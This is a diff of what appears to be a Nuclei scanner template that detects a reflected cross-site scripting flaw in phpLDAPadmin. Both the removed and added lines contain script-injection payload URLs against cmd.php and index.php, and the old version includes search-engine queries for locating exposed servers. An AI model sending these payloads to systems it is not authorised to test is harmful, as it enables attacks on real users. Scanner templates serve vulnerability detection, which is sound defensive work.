@@ -1,52 +1,49 @@
 id: phpldapadmin-xss
 
 info:
-  name: phpLDAPadmin XSS
-  author: rix4uni
+  name: PHP LDAP Admin < 1.2.5 - Cross-Site Scripting
+  author: GodfatherOrwa,herry
   severity: medium
-  description: phpLDAPadmin XSS
   reference:
-    - https://twitter.com/Godfatherrix4uni/status/1701392754251563477
+    - https://twitter.com/GodfatherOrwa/status/1701392754251563477
   metadata:
-    google-query:
-      - intitle:"phpLDAPadmin"
-    shodan-query:
-      - http.title:"phpLDAPadmin"
-    censys-query:
-      - services.http.response.html_title="phpLDAPadmin"
-    fofa-query:
-      - title="phpLDAPadmin"
-    hunter-query:
-      - web.title="phpLDAPadmin"
-  tags: phpldapadmin
+    verified: true
+    max-request: 9
+    shodan-query: html:"phpLDAPadmin"
+  tags: php,phpldapadmin,xss
 
 http:
   - method: GET
     path:
-      - "{{BaseURL}}/phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27rix4uni%27)%3C/ScRiPt%3E&meth=ajax&server_id=1"
-      - "{{BaseURL}}/phpldapadmin/cmd.php?server_id=<script>alert('rix4uni')</script>"
-      - "{{BaseURL}}/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27rix4uni%27)%3C/ScRiPt%3E&meth=ajax&server_id=1"
-      - "{{BaseURL}}/cmd.php?server_id=<script>alert('rix4uni')</script>"
-      - "{{BaseURL}}/phpldapadmin/index.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27rix4uni%27)%3C/ScRiPt%3E&meth=ajax&server_id=1"
-      - "{{BaseURL}}/phpldapadmin/index.php?server_id=<script>alert('rix4uni')</script>"
-      # - "{{BaseURL}}/index.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27rix4uni%27)%3C/ScRiPt%3E&meth=ajax&server_id=1"
-      # - "{{BaseURL}}/index.php?server_id=<script>alert('rix4uni')</script>"
+      - "{{BaseURL}}"
+      - "{{BaseURL}}{{path}}/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1"
+      - "{{BaseURL}}{{path}}/index.php?redirect=true&meth=ajax"
+
+    attack: pitchfork
+    payloads:
+      path:
+        - /
+        - /htdocs/index.php
+        - /phpldapadmin
 
     stop-at-first-match: true
+
     matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
-          - "alert(%27rix4uni%27)"
-          - "alert('rix4uni')"
+          - "<script>alert(document.domain)</script>"
+          - "No such entry"
+        condition: and
 
       - type: word
-        part: body
+        part: header
         words:
-          - "&gt;alert('rix4uni')&lt"
-        negative: true
+          - text/html
 
       - type: status
         status:
           - 200
+
+# digest: 4b0a00483046022100a376207b5b163fbe98e0b41af052248a9e06beb06815b76b8f2117ecf7509dcc022100ae0bbe0b8ab975a2fd3d4b6a15c473f6a4c80cb7b0870f4fa50d613dc38ebd04:922c64590222798bb761d5b6d8e72950
